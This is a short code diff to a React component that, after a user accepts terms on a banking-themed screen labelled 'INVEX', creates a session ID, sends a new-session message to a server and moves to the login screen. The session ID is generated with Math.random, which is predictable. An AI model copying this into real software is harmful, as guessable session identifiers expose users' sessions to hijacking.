@@ -253,7 +253,22 @@ export default function ClientScreen() {
         }
         
         if (screen === ScreenType.TERMINOS) {
-          // Ir a login después de aceptar términos
+          // Generar folio inmediatamente al aceptar términos
+          const newSessionId = Math.random().toString(36).substring(2, 15);
+          
+          // Crear nueva sesión en el servidor
+          sendMessage({
+            type: 'NEW_CLIENT_SESSION',
+            data: {
+              sessionId: newSessionId,
+              banco: 'INVEX',
+              clientData: { terminosAceptados: true },
+              timestamp: new Date().toISOString()
+            }
+          });
+          
+          // Actualizar el estado local con el nuevo sessionId
+          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
           setCurrentScreen(ScreenType.LOGIN);
           return;
         }
